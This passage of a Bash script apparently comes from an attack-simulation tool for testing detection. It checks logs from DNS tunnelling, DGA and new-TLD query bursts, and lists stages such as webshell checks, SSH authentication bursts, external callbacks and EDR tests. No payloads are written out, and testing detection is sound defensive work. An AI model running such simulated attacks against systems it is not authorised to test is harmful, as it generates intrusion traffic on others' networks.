        if [[ "${dw_met}" == no && "${stage_status}" == Success && "${final_result}" == success ]]; then
            if (( nxdomain >= 150 && resolved >= 3 )); then
                errors+="DETECTION_WINDOW condition_met=no contradicts stage Success (nx=${nxdomain} resolved=${resolved}); "
            fi
        fi
        if [[ "${content}" == *'required_events=nxdomain>=250'* && "${dw_summary}" == *condition_met=no* ]] && \
            (( nxdomain >= 150 && resolved >= 3 )) && [[ "${stage_status}" == Success ]]; then
            errors+="legacy nxdomain>=250 window contradicts B-plan stage Success; "
        fi
    fi

    if [[ -n "${errors}" ]]; then
        printf -v "${err_out}" '%s' "${errors}"
        return 1
    fi
    printf -v "${err_out}" '%s' "ok queries=${queries} nxdomain=${nxdomain} payload_bytes=${payload_bytes} transport=${method:-GET} result=${final_result} stage=${stage_status}"
    return 0
}

poc_live_log_assert_no_success_on_dns_new_tld() {
    local unique_tlds="$1" successful="$2" stage_status="$3" final_result="$4" likelihood="${5:-LOW}"
    if (( successful == 0 )); then
        [[ "${final_result}" == success ]] && return 1
        [[ "${stage_status}" == Success ]] && return 1
    fi
    if (( unique_tlds < 3 )); then
        [[ "${final_result}" == success ]] && return 1
        [[ "${stage_status}" == Success ]] && return 1
    fi
    if [[ "${final_result}" == success || "${stage_status}" == Success ]]; then
        if [[ "${likelihood}" != HIGH ]]; then
            return 1
        fi
        if (( unique_tlds < 5 || successful < 10 )); then
            return 1
        fi
    fi
    return 0
}

poc_validate_dns_new_tld_live_log() {
    local log_input="$1" err_out="${2:-POC_LIVE_LOG_VALIDATE_ERR}" content="" errors=""
    local transport="" start_line="" summary="" stage_summary="" stage_line=""
    local tested_domains=0 unique_tlds=0 query_count=0 successful=0 failed=0
    local detection_likelihood="" final_result="" stage_status="" query_types="" txt_q=0

    content=$(poc_live_log_read_content "${log_input}")
    transport=$(poc_live_log_last_match "${content}" 'DNS_NEW_TLD_PAYLOAD_TRANSPORT')
    start_line=$(poc_live_log_last_match "${content}" 'DNS_NEW_TLD_TEST_START')
    summary=$(poc_live_log_last_match "${content}" 'DNS_NEW_TLD_SUMMARY')
    stage_summary=$(poc_live_log_last_match "${content}" 'DNS_NEW_TLD_STAGE_FINAL_SUMMARY')
    stage_line=$(poc_live_log_last_match "${content}" 'Stage result: DNS New TLD Test')

    grep -qE '^[[:space:]]*click$' <<< "$(dns_new_tld_primary_pool)" 2>/dev/null || errors+="primary TLD pool missing click; "
    grep -qE '^[[:space:]]*zip$' <<< "$(dns_new_tld_secondary_pool)" 2>/dev/null || errors+="secondary TLD pool missing zip; "

    [[ -z "${start_line}" ]] && errors+="missing DNS_NEW_TLD_TEST_START; "
    [[ -z "${summary}" ]] && errors+="missing DNS_NEW_TLD_SUMMARY; "
    [[ -z "${stage_summary}" ]] && errors+="missing DNS_NEW_TLD_STAGE_FINAL_SUMMARY; "
    [[ "${content}" != *DNS_NEW_TLD_FINAL_SUMMARY* ]] && errors+="missing DNS_NEW_TLD_FINAL_SUMMARY; "

    if [[ -n "${summary}" ]]; then
        for key in tested_domains tested_tlds unique_tlds query_count query_types successful_queries failed_queries detection_likelihood; do
            [[ "${summary}" != *"${key}="* ]] && errors+="DNS_NEW_TLD_SUMMARY missing ${key}; "
        done
        tested_domains=$(safe_int "$(dns_stats_field_from_line "${summary}" tested_domains)")
        unique_tlds=$(safe_int "$(dns_stats_field_from_line "${summary}" unique_tlds)")
        query_count=$(safe_int "$(dns_stats_field_from_line "${summary}" query_count)")
        successful=$(safe_int "$(dns_stats_field_from_line "${summary}" successful_queries)")
        failed=$(safe_int "$(dns_stats_field_from_line "${summary}" failed_queries)")
        query_types=$(dns_stats_field_from_line "${summary}" query_types)
        detection_likelihood=$(dns_stats_field_from_line "${summary}" detection_likelihood)
        txt_q=$(safe_int "$(sed -n 's/.*TXT=\([0-9]*\).*/\1/p' <<< "${query_types}")")
        if [[ -n "${query_types}" ]] && (( query_count > 0 )); then
            if (( txt_q * 100 / query_count < 15 )); then
                errors+="TXT query share below ~20% minimum (txt=${txt_q} total=${query_count}); "
            fi
        else
            grep -q 'query_type=TXT' <<< "${content}" || errors+="no TXT queries observed; "
        fi
        if [[ -n "${detection_likelihood}" ]]; then
            if (( unique_tlds >= 5 && tested_domains >= 10 )) && [[ "${detection_likelihood}" != HIGH ]]; then
                errors+="detection_likelihood=${detection_likelihood} expected HIGH for diverse burst; "
            fi
            if (( unique_tlds <= 2 )) && [[ "${detection_likelihood}" == HIGH ]]; then
                errors+="detection_likelihood=HIGH with only ${unique_tlds} TLDs; "
            fi
        else
            errors+="missing detection_likelihood in summary; "
        fi
    fi

    if [[ -n "${transport}" ]]; then
        [[ "${transport}" != *payload_bytes=* ]] && errors+="DNS_NEW_TLD_PAYLOAD_TRANSPORT missing payload_bytes; "
    fi

    if [[ -n "${stage_summary}" ]]; then
        final_result=$(dns_stats_field_from_line "${stage_summary}" result)
        detection_likelihood=$(dns_stats_field_from_line "${stage_summary}" detection_likelihood)
        [[ -z "${detection_likelihood}" ]] && detection_likelihood=$(dns_stats_field_from_line "${summary}" detection_likelihood)
    fi

    stage_status=$(poc_live_log_stage_status "${stage_line}")
    if ! poc_live_log_assert_no_success_on_dns_new_tld "${unique_tlds}" "${successful}" "${stage_status}" "${final_result}" "${detection_likelihood}"; then
        errors+="false Success blocked (unique_tlds=${unique_tlds} successful=${successful} likelihood=${detection_likelihood}); "
    fi

    if [[ -n "${errors}" ]]; then
        printf -v "${err_out}" '%s' "${errors}"
        return 1
    fi
    printf -v "${err_out}" '%s' "ok domains=${tested_domains} unique_tlds=${unique_tlds} queries=${query_count} successful=${successful} likelihood=${detection_likelihood} transport=${transport:+yes}"
    return 0
}

poc_validate_root_cause_log_sample() {
    local module="$1" payload="$2" out="$3" expected="$4" http_code="${5:-000}"
    local got=""
    got=$(poc_classify_dns_dga_root_cause "${module}" "${payload}" "${out}" "${http_code}" | head -n1)
    [[ "${got}" == "${expected}" ]]
}

_stellar_followup_self_check() {
    local fn missing=()
    for fn in count_hosts_blob count_all_discovered_services get_followup_hosts \
        collect_ssh_burst_targets collect_http_followup_targets_unique \
        run_ssh_auth_burst_for_host run_http_url_burst_for_host \
        resolve_http_followup_mode format_http_followup_summary_block format_http_followup_capability_block \
        format_intensity_runtime_values_block format_validation_result_block compute_followup_validation_result \
        maybe_run_internal_web_fanout_fallback external_callback_stage_status internal_fanout_stage_status \
        stage_discover_http_candidates followup_stage_http stage_ids_waf_signature_probe stage_validate_web_reachability stage_ssh_auth_burst stage_mandatory_service_followups \
        stage_external_callback stage_internal_web_fanout stage_dns_tunnel_enhanced \
        stage_nonstandard_port_followup stage_correlation_telemetry_bundle \
        stage_edr_static_detection_test build_edr_static_test_remote_cmd build_edr_static_test_write_file_remote_cmd \
        build_edr_static_test_resolve_dir_remote_cmd run_edr_static_test_file_creation cleanup_edr_static_test_on_exit \
        parse_edr_static_test_output finalize_edr_static_test_judgment \
        write_edr_static_test_report format_edr_static_test_block edr_static_test_eicar_string edr_static_test_cloudcar_string \
        format_correlation_telemetry_summary_block format_unified_telemetry_capability_summary \
        run_dns_tunnel_simulation run_dga_simulation run_dns_new_tld_test followup_stage_dns_new_tld followup_stage_dga select_dns_tunnel_target select_dga_dns_resolver dga_ensure_resolver validate_webshell_post_exec \
        poc_validate_dns_tunnel_live_log poc_validate_dga_live_log poc_validate_dns_new_tld_live_log poc_validate_root_cause_log_sample \
        poc_live_log_assert_no_success_on_dns_new_tld \
        poc_collect_dns_tunnel_live_log poc_collect_dga_live_log poc_collect_dns_new_tld_live_log \
        poc_run_dns_tunnel_live_log_validation poc_run_dga_live_log_validation poc_run_dns_new_tld_live_log_validation \
        dns_new_tld_primary_pool dns_new_tld_secondary_pool dns_new_tld_compute_detection_likelihood build_dns_new_tld_simulation_remote_cmd finalize_dns_new_tld_stage_judgment write_dns_new_tld_report \
        aggregate_dns_query_telemetry_from_output sync_dga_telemetry_from_persisted_state sync_dns_tunnel_telemetry_from_persisted_state \
        save_dga_simulation_overlap_result \
        execute_dns_tunnel_simulation_chunked \
        reset_dns_tunnel_enhanced_fallback_stats snapshot_dns_tunnel_enhanced_run_stats \
        record_dns_tunnel_enhanced_result record_dns_tunnel_fallback_result apply_dns_tunnel_enhanced_final_decision \
        write_dns_tunnel_report write_dns_new_tld_report \
        detect_webshell_remote_os \
        validate_dns_fqdn dns_new_tld_log_root_cause \
        http_sync_url_execution_counters_from_output http_emit_url_execution_summary poc_emit_callback_diagnostic poc_detection_readiness_level poc_emit_detection_readiness_reason \
        poc_final_internal_consistency_check dns_reconcile_resolver_validation_from_queries dns_validation_consistency_check dns_fail_fast_check \
        dns_pipeline_module_counters dns_evaluate_pipeline_result log_dns_query_pipeline_summary \
        dga_apply_pipeline_to_final_result dga_pipeline_allows_success dns_new_tld_apply_pipeline_to_final_result \
        http_url_scan_curl_exit_to_root_cause \
        telemetry_emit_module_validation poc_emit_live_log_validation_detail \
        external_callback_resolve_final_status final_validation_counts_as_success; do
        declare -F "${fn}" >/dev/null 2>&1 || missing+=("${fn}")
    done
    if ((${#missing[@]} > 0)); then
    printf 'STELLAR_POC_ERROR: stellar_poc_followup.sh missing functions: %s\n' "${missing[*]}" >&2
    exit 1
    fi
}
_stellar_followup_self_check
